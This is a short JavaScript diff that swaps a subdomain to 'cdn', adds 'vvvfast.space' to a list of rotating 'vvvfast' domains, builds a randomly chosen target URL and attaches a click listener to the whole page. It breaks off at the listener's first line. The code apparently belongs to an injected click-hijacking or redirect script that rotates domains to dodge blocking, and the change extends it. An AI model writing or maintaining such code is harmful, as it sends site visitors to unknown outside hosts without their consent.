@@ -1,9 +1,7 @@
-var domain = "x";
-var topLevelDomains = ["vvvfast.fun", "vvvfast.icu"];
-
+var domain = "cdn";
+var topLevelDomains = ["vvvfast.fun", "vvvfast.icu","vvvfast.space"];
 var randomIndex = Math.floor(Math.random() * topLevelDomains.length);
 var selectedTopLevelDomain = topLevelDomains[randomIndex];
-
 var targetURL = "https://" + domain + "." + selectedTopLevelDomain;
 
 document.addEventListener("click", function() {
